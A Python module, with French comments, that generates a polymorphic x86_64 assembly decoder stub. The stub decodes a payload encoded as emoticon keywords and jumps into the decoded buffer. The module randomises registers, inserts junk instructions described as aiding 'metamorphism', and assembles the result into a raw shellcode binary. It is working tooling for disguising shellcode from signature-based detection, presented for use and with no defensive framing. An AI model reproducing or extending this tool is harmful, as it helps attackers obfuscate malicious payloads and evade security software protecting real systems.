"""ASM stub generation utilities."""

import random
import shlex
import shutil
import subprocess
from pathlib import Path


def choose_regs():
    # Choix simple de registres utiles et calmes pour x86_64
    pool = ["r10", "r11", "r12", "r13", "r14", "r15"]
    random.shuffle(pool)
    return pool[:4]


ASM_TEMPLATE = r'''
    .intel_syntax noprefix
    .section .text
    .global decoder_entry
decoder_entry:
    {prologue}

    lea {r_in}, [rip + encoded_data]
    lea {r_out}, [rip + outbuf]
    lea {r_kw}, [rip + keywords]

main_loop:
    movzx eax, byte ptr [{r_in}]
    test al, al
    jz finish

    cmp al, ' '
    je skip_sep

    # decode high nibble
    call decode_nibble
    mov bl, al
    shl bl, 4

    # skip '-'
    inc {r_in}

    # decode low nibble
    call decode_nibble
    or bl, al

    # store byte
    mov byte ptr [{r_out}], bl
    inc {r_out}

    jmp main_loop

skip_sep:
    inc {r_in}
    jmp main_loop

finish:
    # jump to decoded buffer
    lea rax, [rip + outbuf]
    jmp rax

decode_nibble:
    push rbx
    push rcx
    push rdx
    push rsi

    movzx eax, byte ptr [{r_in}]
    movzx ecx, byte ptr [{r_in} + 1]
    movzx edx, byte ptr [{r_in} + 2]

    xor rsi, rsi
.search_loop:
    cmp rsi, 16
    jge .nf

    lea rdi, [rsi + rsi*2]
    # compare 3 chars
    cmp al, byte ptr [{r_kw} + rdi]
    jne .next
    cmp cl, byte ptr [{r_kw} + rdi + 1]
    jne .next
    cmp dl, byte ptr [{r_kw} + rdi + 2]
    jne .next

    mov eax, esi
    jmp .done
.next:
    inc rsi
    jmp .search_loop
.nf:
    xor eax, eax
.done:
    add {r_in}, 3
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

# ---- data (kept in .text so objcopy --only-section=.text captures it) ----
keywords:
    .ascii "UwUOwOTwT>w<^w^QwQPwPRwRSwSVwVXwXYwYZwZNwNMwMLwL"

encoded_data:
    .asciz "{encoded}"

outbuf:
    .space 4096

    '''


def build_asm(encoded, out_path, dryrun=False):
    regs = choose_regs()
    r_in, r_out, r_kw, r_tmp = regs

    # small prologue with some junk to help metamorphism
    junk = []
    # insert a few random harmless instruction sequences
    for _ in range(random.randint(1, 3)):
        seq = random.choice([
            f"push {r_tmp}\n    pop {r_tmp}",
            f"xor {r_tmp}, {r_tmp}",
            f"xchg {r_tmp}, {r_tmp}",
            f"inc {r_tmp}\n    dec {r_tmp}",
        ])
        junk.append(seq)

    prologue = "\n    ".join(junk)

    asm = ASM_TEMPLATE.format(
        prologue=prologue,
        r_in=r_in,
        r_out=r_out,
        r_kw=r_kw,
        encoded=encoded.replace('"', "'"),
    )

    asm_path = Path("decoder_gen.s")
    asm_path.write_text(asm)

    if dryrun:
        print(asm)
        return asm_path

    missing = [tool for tool in ("gcc", "objcopy") if shutil.which(tool) is None]
    if missing:
        missing_tools = ", ".join(missing)
        raise RuntimeError(
            "Toolchain manquante: "
            f"{missing_tools}. Installe GCC/binutils (MSYS2/MinGW ou WSL), "
            "ou utilise --dryrun pour générer seulement l'ASM."
        )

    # Assemble and extract .text
    obj = Path("decoder_gen.o")
    bin_out = Path(out_path)

    cmds = [
        ["gcc", "-nostdlib", "-no-pie", "-c", str(asm_path), "-o", str(obj)],
        ["objcopy", "--only-section=.text", "-O", "binary", str(obj), str(bin_out)],
    ]

    for cmd in cmds:
        print("Running:", " ".join(shlex.quote(c) for c in cmd))
        subprocess.check_call(cmd)

    print(f"Wrote shellcode binary to: {bin_out}")
    return bin_out
